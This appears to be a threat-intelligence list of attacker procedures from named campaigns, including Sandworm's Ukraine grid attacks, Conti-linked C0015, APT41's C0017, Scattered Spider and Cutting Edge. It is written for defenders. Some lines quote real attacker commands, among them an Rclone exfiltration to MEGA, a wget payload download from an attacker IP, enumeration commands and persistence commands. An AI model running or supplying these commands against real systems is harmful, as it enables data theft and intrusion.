During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security.
During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement.
During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems.
During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after `FONTCACHE.DAT`, `rundll32.exe`, and the associated .lnk file is delivered.
During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.
During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin.
During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network.
During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them.
During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet. .
During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems.
During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2.
During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets.
During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using `rundll32.exe`.
During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails.
During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network.
During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called `vba_macro.exe`. This macro dropped `FONTCACHE.DAT`, the primary BlackEnergy implant; `rundll32.exe`, for executing the malware; `NTUSER.log`, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines.
During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used the `sp_addlinkedsrvlogin` command in MS-SQL to create a link between a created account and other servers in the network.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.
During the 2016 Ukraine Electric Power Attack, Sandworm Team added a login to a SQL Server with `sp_addlinkedsrvlogin`.
During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems.
During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, “admin” and “система” (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used `move` to transfer files to a network share.
During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as `.txt` files.
During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.
During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.
During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized `net use` to connect to network shares.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz.
During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used the `xp_cmdshell` command in MS-SQL.
During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys.
During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary.
During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.
During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.
During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable `msserver.exe` from a staging server to a local hard drive before deployment.
During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.
During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel.
During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.
During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a “Yamux” TLS-based C2 channel with an external server(s).
During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time.
During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the `WantedBy=multi-user.target` configuration to run GOGETTER when the system begins accepting user logins.
During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server.
For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.
During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.
During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.
For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.
During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.
For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.
For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.
For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.
For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.
For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered.
For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India.
During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email.
During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email.
During C0011, Transparent Tribe sent malicious attachments via email to student targets in India.
During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India.
For C0011, Transparent Tribe hosted malicious documents on domains registered by the group.
For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.
For C0015, the threat actors used DLL files that had invalid certificates.
During C0015, the threat actors used Conti ransomware to encrypt a compromised network.
During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration.
During C0015, the threat actors obtained files and data from the compromised network.
During C0015, the threat actors collected files from network shared drives prior to network encryption.
During C0015, the threat actors use the command `net group "domain admins" /dom` to enumerate domain groups.
During C0015, the threat actors used the command `nltest /domain_trusts /all_trusts` to enumerate domain trusts.
During C0015, the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process.
During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.
During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.
During C0015, the threat actors downloaded additional tools and files onto a compromised network.
During C0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.
During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.
During C0015, PowerView's file share enumeration results were stored in the file `c:\ProgramData\found_shares.txt`.
During C0015, the threat actors used the command `net localgroup "adminstrator" ` to identify accounts with local administrator rights.
During C0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document.
For C0015, the threat actors used Cobalt Strike and Conti ransomware.
During C0015, the threat actors named a binary file `compareForfor.jpg` to disguise it as a JPG file.
During C0015, the threat actors used `mshta` to execute DLLs.
During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares.
During C0015, the threat actors used Base64-encoded strings.
During C0015, the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes.
During C0015, the threat actors employed code that used `regsvr32` for execution.
During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network.
During C0015, the threat actors used RDP to access specific network hosts of interest.
During C0015, the threat actors used the commands `net view /all /domain` and `ping` to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.
During C0015, the threat actors loaded DLLs via `rundll32` using the `svchost` process.
For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.
During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.
During C0015, the threat actors used the command `net view /all time` to gather the local time of a compromised network.
For C0015, the threat actors obtained a variety of tools, including AdFind,  AnyDesk, and Process Hacker.
During C0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.
During C0015, the threat actors used `cmd.exe` to execute commands and run malicious binaries.
During C0015, the threat actors used `wmic` and `rundll32` to load Cobalt Strike onto a target host.
During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local `NT AUTHORITY\SYSTEM` privilege escalation.
During C0017, APT41 hex-encoded PII data prior to exfiltration.
During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.
During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign.
During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.
During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.
During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.
During C0017, APT41 used Cloudflare services for data exfiltration.
During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.
During C0017, APT41 abused named pipe impersonation for privilege escalation.
During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.
During C0017, APT41 downloaded malicious payloads onto compromised systems.
During C0017, APT41 deployed JScript web shells on compromised systems.
During C0017, APT41 copied the local `SAM` and `SYSTEM` Registry hives to a staging directory.
During C0017, APT41 used `SCHTASKS  /Change` to modify legitimate scheduled tasks to run malicious code.
During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections.
During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.
During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.
During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic.
During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility`, `\Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`.
During C0017, APT41 copied the `SAM` and `SYSTEM` Registry hives for credential harvesting.
During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries.
During C0017, APT41 issued `ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+` commands to find the volume serial number of compromised systems.
During C0017, APT41 used `cmd.exe /c ping %userdomain%` for discovery.
During C0017, APT41 used `whoami` to gather information from victim machines.
For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.
During C0017, APT41 ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.
During C0017, APT41 used the Cloudflare services for C2 communications.
During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects.
During C0017, APT41 used `cmd.exe` to execute reconnaissance commands.
During C0018, the threat actors used Base64 to encode their PowerShell scripts.
During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network.
During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.
During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network.
During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.
During C0018, AvosLocker was disguised using the victim company name as the filename.
For C0018, the threat actors renamed a Sliver payload to `vmware_kb.exe`.
During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning.
During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.
During C0018, the threat actors used encoded PowerShell scripts for execution.
During C0018, the threat actors used AnyDesk to transfer tools between systems.
During C0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.
During C0018, the threat actors used `rundll32` to run Mimikatz.
During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.
During C0018, the threat actors ran `nslookup` and Advanced IP Scanner on the target network.
During C0018, the threat actors collected `whoami` information via PowerShell scripts.
For C0018, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.
During C0018, the threat actors used HTTP for C2 communications.
During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (`wmiprvse.exe`) to execute a variety of encoded PowerShell scripts using the `DownloadString` method.
During C0021, the threat actors used SSL via TCP port 443 for C2 communications.
During C0021, the threat actors used encoded PowerShell commands.
During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'`, in place of `FromBase64String` which is normally used to decode base64.
For C0021, the threat actors registered domains for use in C2.
For C0021, the threat actors used legitimate but compromised domains to host malicious payloads.
For C0021, the threat actors embedded a base64-encoded payload within a LNK file.
During C0021, the threat actors downloaded additional tools and files onto victim machines.
During C0021, the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file.
During C0021, the threat actors used TCP for some C2 communications.
During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.
During C0021, the threat actors used `rundll32.exe` to execute the Cobalt Strike Beacon loader DLL.
During C0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.
For C0021, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile.
For C0021, the threat actors uploaded malware to websites under their control.
During C0021, the threat actors used HTTP for some of their C2 communications.
During C0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.
During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.
During C0026, the threat actors collected documents from compromised hosts.
For C0026, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware.
During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.
During C0026, the threat actors downloaded malicious payloads onto select compromised hosts.
During C0027, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.
During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.
During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.
During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants.
During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes.
During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.
During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.
During C0027, Scattered Spider sent phishing messages via SMS to steal credentials.
During C0027, Scattered Spider performed domain replication.
During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.
During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN.
During C0027, Scattered Spider accessed Azure AD to identify email addresses.
During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.
During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.
During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.
During C0027, Scattered Spider downloaded tools using victim organization systems.
During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.
During C0027, used RustScan to scan for open ports on targeted ESXi appliances.
During C0027, Scattered Spider used SSH tunneling in targeted environments.
During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.
During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.
During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.
During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials.
During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.
During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.
During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.
During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee.
During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket.
During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment.
During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.
During the C0032 campaign, TEMP.Veles modified and added entries within &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&lt;/code&gt; to maintain persistence.
During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials.
During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.
During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.
During the C0032 campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.
During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping.
During the C0032 campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.
During the C0032 campaign, TEMP.Veles utilized RDP throughout an operation.
During the C0032 campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.
During the C0032 campaign, TEMP.Veles used scheduled task XML triggers.
During the C0032 campaign, TEMP.Veles used timestomping to modify the &lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt; attribute on tools.
During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec.
During the C0032 campaign, TEMP.Veles used compromised VPN accounts.
During the C0032 campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure.
During the C0032 campaign, TEMP.Veles planted Web shells on Outlook Exchange servers.
During CostaRicto, the threat actors collected data and files from compromised networks.
For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.
During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.
During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.
For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.
During CostaRicto, the threat actors used a layer of proxies to manage C2 communications.
During CostaRicto, the threat actors employed nmap and pscan to scan target environments.
During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.
During CostaRicto, the threat actors used scheduled tasks to download backdoor tools.
During CostaRicto, the threat actors obtained open source tools to use in their operations.
During Cutting Edge, threat actors saved collected data to a tar archive.
During Cutting Edge, threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.
During Cutting Edge, threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.
During Cutting Edge, threat actors used DNS to tunnel IPv4 C2 traffic.
During Cutting Edge, threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.
During Cutting Edge, threat actors disabled logging and modified the `compcheckresult.cgi` component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.
During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks.
During Cutting Edge, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure `dsls` binary.
During Cutting Edge, threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.
During Cutting Edge, threat actors deleted `/tmp/test1.txt` on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.
During Cutting Edge, threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.
During Cutting Edge, threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.
During Cutting Edge, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.
During Cutting Edge, threat actors used Task Manager to dump LSASS memory from Windows devices to disk.
During Cutting Edge, threat actors accessed and mounted virtual hard disk backups to extract 
ntds.dit.
During Cutting Edge, threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.
During Cutting Edge, threat actors used the Unix socket and a reverse TCP shell for C2 communications.
During Cutting Edge, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.
During Cutting Edge, threat actors used Iodine to tunnel IPv4 traffic over DNS.
During Cutting Edge, threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.
During Cutting Edge, threat actors used RDP with compromised credentials for lateral movement.
During Cutting Edge, threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.
During Cutting Edge, threat actors used SSH for lateral movement.
During Cutting Edge, threat actors peformed reconnaissance of victims' internal websites via proxied connections.
During Cutting Edge, threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.
During Cutting Edge, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.
During Cutting Edge, threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory.
During Cutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the `/tmp/clientsDownload.sock` socket.
During Cutting Edge, threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.
During Cutting Edge, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.
During Cutting Edge, threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as WIREFIRE, GLASSTOKEN, BUSHWALK, LIGHTWIRE, and FRAMESTING.
During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information.
During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2.
During Frankenstein, the threat actors ran encoded commands from the command line.
During Frankenstein, the threat actors used Empire to gather various local system information.
During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.
During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2.
During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.
During Frankenstein, the threat actors downloaded files and tools onto a victim machine.
During Frankenstein, the threat actors used MSbuild to execute an actor-created file.
During Frankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.
During Frankenstein, the threat actors named a malicious scheduled task "WinUpdate" for persistence.
During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.
During Frankenstein, the threat actors used Empire to obtain a list of all running processes.
During Frankenstein, the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named "WinUpdate"
During Frankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system.
During Frankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.
During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.
During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.
During Frankenstein, the threat actors used Empire to obtain the compromised machine's name.
During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system.
During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information.
During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.
For Frankenstein, the threat actors obtained and used Empire.
During Frankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.
During Frankenstein, the threat actors used HTTP GET requests for C2.
During Frankenstein, the threat actors ran a command script to set up persistence as a scheduled task named "WinUpdate", as well as other encoded commands from the command-line
During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.
During FunnyDream, the threat actors used 7zr.exe to add collected files to an archive.
For FunnyDream, the threat actors registered a variety of domains.
For FunnyDream, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.
During FunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system.
For FunnyDream, the threat actors used a new backdoor named FunnyDream.
During FunnyDream, the threat actors used Tasklist on targeted systems.
During FunnyDream, the threat actors used several tools and batch files to map victims' internal networks.
During FunnyDream, the threat actors used Systeminfo to collect information on targeted hosts.
During FunnyDream, the threat actors used ipconfig for discovery on remote systems.
During FunnyDream, the threat actors used netstat to discover network connections on remote systems.
For FunnyDream, the threat actors used a modified version of the open source PcShare remote administration tool.
During FunnyDream, the threat actors used a Visual Basic script to run remote commands.
During FunnyDream, the threat actors used `cmd.exe` to execute the wmiexec.vbs script.
During FunnyDream, the threat actors used `wmiexec.vbs` to run remote commands.
During Night Dragon, the threat actors collected files and other data from compromised systems.
During Night Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.
During Night Dragon, threat actors used domain accounts to gain further access to victim systems.
During Night Dragon, threat actors used dynamic DNS services for C2.
During Night Dragon, threat actors used a DLL that included an XOR-encoded section.
During Night Dragon, threat actors used SQL injection exploits against extranet web servers to gain access.
During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.
During Night Dragon, threat actors used company extranet servers as secondary C2 servers.
During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system.
During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.
During Night Dragon, threat actors used RAT malware to exfiltrate email archives.
During Night Dragon, threat actors enticed users to click on links in spearphishing emails to download malware.
During Night Dragon, threat actors used Trojans from underground hacker websites.
During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.
During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.
During Night Dragon, threat actors used Cain &amp; Abel to crack password hashes.
During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels.
During Night Dragon, threat actors copied files to company web servers and subsequently downloaded them.
During Night Dragon, threat actors dumped account hashes using gsecdump.
During Night Dragon, threat actors purchased hosted services to use for C2.
During Night Dragon, threat actors compromised web servers to use for C2.
During Night Dragon, threat actors used software packing in its tools.
During Night Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.
During Night Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.
During Night Dragon, threat actors obtained and used tools such as gsecdump.
During Night Dragon, threat actors uploaded commonly available hacker tools to compromised web servers.
During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.
During Night Dragon, threat actors used HTTP for C2.
During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and run command-line shells.
During Operation CuckooBees, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.
During Operation CuckooBees, the threat actors executed an encoded VBScript file.
During Operation CuckooBees, the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.
During Operation CuckooBees, the threat actors collected data, files, and other information from compromised networks.
During Operation CuckooBees, the threat actors used the `dsquery` and `dsget` commands to get domain environment information and to query users in administrative groups.
During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement.
During Operation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers.
During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: `cscript //nologo "C:\Windows\System32\winrm.vbs" set winrm/config/service@{EnableCompatibilityHttpsListener="true"}`.
During Operation CuckooBees, the threat actors used `dir c:\\` to search for files.
During Operation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.
During Operation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence.
